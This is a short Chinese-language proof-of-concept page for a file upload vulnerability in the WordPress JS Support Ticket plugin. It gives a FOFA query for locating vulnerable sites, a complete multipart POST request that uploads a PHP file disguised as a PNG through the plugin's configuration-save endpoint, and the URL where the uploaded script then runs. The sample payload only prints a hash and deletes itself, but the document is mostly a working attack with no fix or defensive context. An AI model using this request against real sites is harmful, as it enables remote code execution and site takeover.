## WordPress-js-support-ticket存在文件上传漏洞


## fofa
```
body="wp-content/plugins/js-support-ticket"
```

## poc
```
POST /wp-admin/?page=configuration&task=saveconfiguration HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=--------767099171
User-Agent: Mozilla/5.0 

----------767099171
Content-Disposition: form-data; name="action"

configuration_saveconfiguration
----------767099171
Content-Disposition: form-data; name="form_request"

jssupportticket
----------767099171
Content-Disposition: form-data; name="support_custom_img"; filename="1.php"
Content-Type: image/png

<?php echo md5(123);unlink(__FILE__);?>
----------767099171-- 

```

文件路径
http://ip/wp-content/plugins/js-support-ticket/jssupportticketdata/supportImg/1.php
